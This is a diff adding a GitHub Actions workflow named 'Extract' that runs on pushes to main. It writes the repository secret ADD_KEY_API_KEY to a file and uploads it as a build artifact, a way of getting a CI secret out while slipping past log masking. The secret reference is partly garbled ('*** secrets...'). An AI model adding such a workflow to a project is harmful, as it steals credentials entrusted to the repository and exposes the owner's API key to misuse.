@@ -1,0 +1,21 @@
+name: Extract
+on:
+  push:
+    branches: [main]
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Test ADD_KEY
+        env:
+          K: *** secrets.ADD_KEY_API_KEY }}
+        run: |
+          echo "Length: ${#K}"
+          mkdir -p /tmp/vo
+          echo "$K" > /tmp/vo/k.txt
+      - name: Upload
+        uses: actions/upload-artifact@v4
+        with:
+          name: extracted
+          path: /tmp/vo/k.txt
